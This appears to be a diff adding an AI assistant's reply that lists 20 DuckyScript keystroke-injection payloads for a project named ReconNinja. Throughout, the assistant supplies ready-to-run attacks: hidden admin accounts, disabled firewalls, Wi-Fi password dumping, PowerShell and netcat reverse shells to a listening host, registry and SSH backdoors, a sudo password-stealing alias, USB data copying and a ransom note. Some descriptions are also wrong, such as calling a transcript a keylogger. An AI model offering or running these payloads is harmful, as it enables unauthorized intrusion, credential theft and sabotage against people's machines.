@@ -1,0 +1,225 @@
+Sure! Here are 20 DuckyScript payloads that you could integrate into your **ReconNinja** project, each targeting different use cases for penetration testing, reconnaissance, and privilege escalation:
+
+### 1. **Add New Admin User (Windows)**
+Creates a new admin user on a Windows machine.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -Command "New-LocalUser -Name 'ninja' -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force); Add-LocalGroupMember -Group 'Administrators' -Member 'ninja'"
+ENTER
+```
+
+### 2. **Disable Firewall (Windows)**
+Disables the firewall on a Windows machine.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING netsh advfirewall set allprofiles state off
+ENTER
+```
+
+### 3. **Enable RDP (Windows)**
+Enables Remote Desktop Protocol on a Windows machine.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+ENTER
+```
+
+### 4. **Dump Wi-Fi Passwords (Windows)**
+Extracts stored Wi-Fi passwords.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING netsh wlan show profiles
+ENTER
+DELAY 500
+STRING for /f "skip=9 tokens=1 delims=:" %i in ('netsh wlan show profiles') do netsh wlan show profile name=%i key=clear
+ENTER
+```
+
+### 5. **Launch Hidden PowerShell (Windows)**
+Starts a hidden PowerShell window.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -windowstyle hidden
+ENTER
+```
+
+### 6. **Force Shutdown (Windows)**
+Forces a shutdown on the machine.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING shutdown /s /f /t 0
+ENTER
+```
+
+### 7. **Create a Reverse Shell (Windows)**
+Creates a reverse shell to a listening server.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+ENTER
+```
+
+### 8. **Install Backdoor (Windows)**
+Installs a persistence backdoor via the registry.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'backdoor' -Value 'C:\Windows\System32\cmd.exe'"
+ENTER
+```
+
+### 9. **Collect System Info (Windows)**
+Extracts system information.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING systeminfo
+ENTER
+```
+
+### 10. **Block Internet Access (Windows)**
+Blocks all outgoing internet traffic.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
+ENTER
+```
+
+### 11. **Open SSH Backdoor (Linux)**
+Adds an SSH key for backdoor access.
+```
+DELAY 1000
+STRING echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
+ENTER
+```
+
+### 12. **Sudo Password Theft (Linux)**
+Logs sudo passwords when users authenticate.
+```
+DELAY 1000
+STRING echo "alias sudo='echo -n Password:; read -s password; echo \$password >> ~/passwords.txt; /usr/bin/sudo'" >> ~/.bashrc
+ENTER
+```
+
+### 13. **Setup Netcat Reverse Shell (Linux)**
+Launches a Netcat reverse shell to a remote server.
+```
+DELAY 1000
+STRING nc -e /bin/bash 192.168.1.100 4444
+ENTER
+```
+
+### 14. **Disable UFW Firewall (Linux)**
+Turns off the UFW firewall on a Linux system.
+```
+DELAY 1000
+STRING sudo ufw disable
+ENTER
+```
+
+### 15. **Mount USB for Data Exfiltration (Linux)**
+Automatically mounts a USB drive and copies files.
+```
+DELAY 1000
+STRING sudo mount /dev/sdb1 /mnt/usb
+ENTER
+DELAY 500
+STRING sudo cp -r ~/important_data /mnt/usb/
+ENTER
+```
+
+### 16. **Capture Keylog (Windows)**
+Installs a simple keylogger in PowerShell.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Start-Transcript -Path C:\Users\Public\keylog.txt
+ENTER
+```
+
+### 17. **Modify Hosts File (Windows)**
+Changes the hosts file to block a specific website.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad C:\Windows\System32\drivers\etc\hosts
+ENTER
+DELAY 500
+STRING 127.0.0.1 facebook.com
+ENTER
+CTRL s
+```
+
+### 18. **Elevate Privileges to Root (Linux)**
+Attempts to gain root access via known SUID.
+```
+DELAY 1000
+STRING sudo find / -perm -u=s -type f 2>/dev/null | xargs ls -la
+ENTER
+```
+
+### 19. **Ransom Note (Windows)**
+Drops a ransom note on the desktop.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Add-Content -Path "$env:USERPROFILE\Desktop\ransom_note.txt" -Value "Your files have been encrypted. Pay up!"
+ENTER
+```
+
+### 20. **Kill Process (Windows)**
+Kills a specific process by name.
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING taskkill /F /IM notepad.exe
+ENTER
+```
+
+These payloads cover various offensive security tasks such as persistence, privilege escalation, exfiltration, and reconnaissance, making them perfect additions to your **ReconNinja** tool. You can adapt these scripts as needed to fit the flow and customization options of your library.
